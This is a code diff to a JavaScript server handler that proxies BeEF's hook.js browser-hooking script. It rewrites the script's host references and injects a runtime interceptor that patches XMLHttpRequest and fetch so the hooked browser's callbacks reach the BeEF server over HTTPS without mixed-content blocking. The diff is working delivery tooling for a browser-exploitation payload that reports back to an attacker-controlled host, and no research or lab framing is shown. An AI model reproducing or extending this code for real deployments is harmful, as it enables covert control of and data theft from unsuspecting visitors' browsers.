@@ -87,8 +87,6 @@ export default async function handler(req, res) {
     if (countHttpHost) hookScript = hookScript.replace(httpHostRegex, origin);
     if (countProtoRel) hookScript = hookScript.replace(protoRelRegex, origin);
     if (countHostPort) {
-      // replace with origin without scheme when needed (e.g. host:3000 -> host:3000 replaced by origin host[:port])
-      // here we replace bare host:port with origin (may add scheme which is OK for hook.js)
       hookScript = hookScript.replace(
         hostPortRegex,
         origin.replace(/^https?:\/\//, "")
@@ -107,8 +105,54 @@ export default async function handler(req, res) {
       hookScript = hookScript.replace(httpFullOriginRegex, origin);
     }
 
+    // CRITICAL FIX: Inject URL interceptor at the START of hook.js
+    // This patches BeEF's AJAX calls to rewrite HTTP URLs to HTTPS at runtime
+    const urlInterceptor = `
+// === INJECTED URL INTERCEPTOR FOR MIXED CONTENT FIX ===
+(function() {
+  const BEEF_ORIGIN = '${origin}';
+  const BEEF_HOST = '${hostname}';
+  
+  // Store original XMLHttpRequest methods
+  const originalOpen = XMLHttpRequest.prototype.open;
+  const originalSend = XMLHttpRequest.prototype.send;
+  
+  // Patch XMLHttpRequest.open to rewrite URLs
+  XMLHttpRequest.prototype.open = function(method, url, ...args) {
+    // Convert URL to string and check if it needs fixing
+    let fixedUrl = String(url);
+    
+    // Replace http://beef-host:3000 with https://beef-host
+    if (fixedUrl.includes('http://' + BEEF_HOST)) {
+      fixedUrl = fixedUrl.replace(/http:\\/\\/[^/]+/, BEEF_ORIGIN);
+      console.log('[BeEF Proxy] Rewrote URL:', url, '->', fixedUrl);
+    }
+    
+    return originalOpen.call(this, method, fixedUrl, ...args);
+  };
+  
+  // Also patch fetch if BeEF uses it
+  if (window.fetch) {
+    const originalFetch = window.fetch;
+    window.fetch = function(url, ...args) {
+      let fixedUrl = String(url);
+      if (fixedUrl.includes('http://' + BEEF_HOST)) {
+        fixedUrl = fixedUrl.replace(/http:\\/\\/[^/]+/, BEEF_ORIGIN);
+        console.log('[BeEF Proxy] Rewrote fetch URL:', url, '->', fixedUrl);
+      }
+      return originalFetch.call(this, fixedUrl, ...args);
+    };
+  }
+})();
+// === END URL INTERCEPTOR ===
+
+`;
+
+    // Prepend the interceptor to the hook script
+    hookScript = urlInterceptor + hookScript;
+
     console.log(
-      `Proxied hook.js from ${origin} — replacements: http:${countHttpHost}, protoRel:${countProtoRel}, hostPort:${countHostPort}`
+      `Proxied hook.js from ${origin} — replacements: http:${countHttpHost}, protoRel:${countProtoRel}, hostPort:${countHostPort} + runtime interceptor injected`
     );
 
     // Basic sanity check: ensure we are returning JS (not an HTML error page)
@@ -117,9 +161,6 @@ export default async function handler(req, res) {
       console.warn(
         "Fetched hook.js looks like HTML (possible error page). Returning it anyway."
       );
-      // Optionally: return an error instead:
-      // res.status(502).send("// Error: fetched resource was not JavaScript");
-      // return;
     }
 
     res.status(200).send(hookScript);
